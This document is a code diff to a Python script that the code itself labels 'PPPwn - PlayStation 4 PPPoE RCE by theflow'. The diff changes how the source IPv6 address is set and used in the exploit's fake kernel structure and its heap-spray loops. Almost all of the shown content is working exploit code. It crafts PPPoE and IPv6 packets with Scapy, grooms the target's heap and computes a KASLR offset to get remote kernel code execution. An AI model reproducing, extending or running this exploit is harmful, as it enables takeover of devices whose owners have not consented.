@@ -168,16 +168,15 @@ class Exploit():
     TARGET_IPV4 = '192.168.2.2'
     BPF_FILTER = '(ip6) || (pppoed) || (pppoes && !ip)'
 
-    def __init__(self, offs, iface, sipv):
+    def __init__(self, offs, iface, ipva):
         self.offs = offs
         self.iface = iface
-        self.sipv = sipv
         self.s = conf.L2socket(iface=self.iface, filter=self.BPF_FILTER)
-        
-        if sipv == "1":
-            self.SOURCE_IPV6 = 'fe80::4141:4141:4141:4141'
-        else:
-            self.SOURCE_IPV6 = 'fe80::9f9f:41ff:9f9f:41ff'
+        self.SOURCE_IPV6 = ipva
+        self.PARTIAL_IPV6 = self.SOURCE_IPV6[self.SOURCE_IPV6.find('::')+7:]
+        self.TYPE_IPV6 = self.SOURCE_IPV6[:self.SOURCE_IPV6.find('::')+2]
+        self.UINT_IPV6 = int(self.SOURCE_IPV6[self.SOURCE_IPV6.find('::')+2:].replace(':', ''), 16)
+
 
     def kdlsym(self, addr):
         return self.kaslr_offset + addr
@@ -459,10 +458,7 @@ class Exploit():
         fake_lle += p32(0)  # sin6_flowinfo
         # sin6_addr
         fake_lle += p64be(0xfe80000100000000)
-        if self.sipv == "1":
-            fake_lle += p64be(0x4141414141414141)
-        else:
-            fake_lle += p64be(0x9f9f41ff9f9f41ff)
+        fake_lle += p64be(self.UINT_IPV6)
         
         fake_lle += p32(0)  # sin6_scope_id
 
@@ -621,7 +617,6 @@ class Exploit():
 
         print('')
         print('[+] STAGE 0: Initialization')
-        print('[+] Source IPv6:',self.SOURCE_IPV6)
 
         self.ppp_negotation(self.build_fake_ifnet)
         self.lcp_negotiation()
@@ -635,17 +630,14 @@ class Exploit():
 
         self.target_ipv6 = pkt[IPv6].src
         print('[+] Target IPv6: {}'.format(self.target_ipv6))
+        
 
         for i in range(self.SPRAY_NUM):
             if i % 0x100 == 0:
                 print('[*] Heap grooming...{}%'.format(100 * i //self.SPRAY_NUM),end='\r',flush=True)
 
-            if self.sipv == "1":
-                source_ipv6 = 'fe80::{:04x}:4141:4141:4141'.format(i)
-            else:
-                source_ipv6 = 'fe80::{:04x}:41ff:9f9f:41ff'.format(i)
-            
-            
+            source_ipv6 = str(self.TYPE_IPV6+'{:04x}:'+self.PARTIAL_IPV6).format(i)
+
             self.s.send(
                 Ether(src=self.source_mac, dst=self.target_mac) /
                 IPv6(src=source_ipv6, dst=self.target_ipv6) /
@@ -724,11 +716,7 @@ class Exploit():
             if i >= self.HOLE_START and i % self.HOLE_SPACE == 0:
                 continue
 
-            if self.sipv == "1":
-                source_ipv6 = 'fe80::{:04x}:4141:4141:4141'.format(i)
-            else:
-                source_ipv6 = 'fe80::{:04x}:41ff:9f9f:41ff'.format(i)
-
+            source_ipv6 = str(self.TYPE_IPV6+'{:04x}:'+self.PARTIAL_IPV6).format(i)
 
             self.s.send(
                 Ether(src=self.source_mac, dst=self.target_mac) /
@@ -843,7 +831,7 @@ def main():
                             '1100'
                         ],
                         default='1100')
-    parser.add_argument('--ipv', default='0')
+    parser.add_argument('--ipv', default='fe80::9f9f:41ff:9f9f:41ff')
     args = parser.parse_args()
 
     print('[+] PPPwn - PlayStation 4 PPPoE RCE by theflow')
